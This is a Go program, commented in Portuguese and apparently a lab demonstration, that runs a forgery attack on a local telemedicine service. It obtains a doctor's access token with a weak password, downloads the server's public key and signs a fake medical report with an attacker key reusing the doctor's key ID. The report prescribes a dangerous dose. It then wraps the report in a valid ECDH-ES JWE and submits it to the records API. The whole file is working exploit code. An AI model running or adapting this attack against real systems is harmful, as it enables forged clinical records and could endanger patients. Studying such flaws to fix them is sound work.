package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/go-jose/go-jose/v4"
)

func main() {
	fmt.Println("=== ATAQUE MiTM: SUBSTITUIÇÃO DO LAUDO ===\n")

	// 1) Token "roubado" (simula o token capturado na rede em HTTP puro)
	resp, err := http.PostForm(
		"http://localhost:8080/realms/Telemedicina-Realm/protocol/openid-connect/token",
		url.Values{
			"grant_type": {"password"},
			"client_id":  {"portal-medico-app"},
			"username":   {"dr.silva"},
			"password":   {"admin"},
			"scope":      {"openid"},
		})
	if err != nil {
		log.Fatal(err)
	}
	var tk struct {
		AccessToken string `json:"access_token"`
	}
	json.NewDecoder(resp.Body).Decode(&tk)
	resp.Body.Close()
	fmt.Println("[atacante] 1. Access Token roubado do dr.silva")

	// 2) Chave pública do servidor (é pública, qualquer um baixa)
	resp, err = http.Get("http://localhost:8081/.well-known/jwks.json")
	if err != nil {
		log.Fatal(err)
	}
	var jwks jose.JSONWebKeySet
	json.NewDecoder(resp.Body).Decode(&jwks)
	resp.Body.Close()
	chaveServidor := jwks.Keys[0]
	fmt.Println("[atacante] 2. Chave pública do servidor obtida:", chaveServidor.KeyID)

	// 3) Chave PRÓPRIA do atacante, fingindo ser a do médico (mesmo kid)
	privAtacante, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	chaveFalsa := jose.JSONWebKey{
		Key:       privAtacante,
		KeyID:     "dr.silva-assinatura",
		Algorithm: string(jose.ES256),
	}
	fmt.Println("[atacante] 3. Chave falsa gerada com kid = dr.silva-assinatura")

	// 4) Laudo falso em nome do dr.silva
	laudoFalso := map[string]any{
		"medico":      "dr.silva",
		"paciente_id": "PAC-2026-0042",
		"diagnostico": "Hipertensao arterial estagio 1",
		"prescricao":  "Losartana 500mg, 10x ao dia", // dose perigosa
		"iat":         time.Now().Unix(),
	}
	payload, _ := json.Marshal(laudoFalso)

	assinador, err := jose.NewSigner(
		jose.SigningKey{Algorithm: jose.ES256, Key: &chaveFalsa},
		(&jose.SignerOptions{}).WithType("JWT"))
	if err != nil {
		log.Fatal(err)
	}
	objJWS, _ := assinador.Sign(payload)
	jws, _ := objJWS.CompactSerialize()
	fmt.Println("[atacante] 4. Laudo falso assinado (prescrição: Losartana 500mg, 10x ao dia)")

	// 5) Cifra com ECDH-ES: JWE perfeitamente válido
	cifrador, err := jose.NewEncrypter(
		jose.A128GCM,
		jose.Recipient{Algorithm: jose.ECDH_ES, Key: &chaveServidor},
		(&jose.EncrypterOptions{}).WithContentType("JWT"))
	if err != nil {
		log.Fatal(err)
	}
	objJWE, _ := cifrador.Encrypt([]byte(jws))
	jwe, _ := objJWE.CompactSerialize()
	fmt.Println("[atacante] 5. JWE válido montado com ECDH-ES (epk do atacante)")

	// 6) Envia ao servidor
	req, _ := http.NewRequest("POST", "http://localhost:8081/api/prontuarios",
		strings.NewReader(jwe))
	req.Header.Set("Content-Type", "application/jose")
	req.Header.Set("Authorization", "Bearer "+tk.AccessToken)

	resp, err = http.DefaultClient.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	corpo, _ := io.ReadAll(resp.Body)

	fmt.Println("\n[servidor] Resposta:", resp.Status)
	fmt.Println("[servidor]", strings.TrimSpace(string(corpo)))
}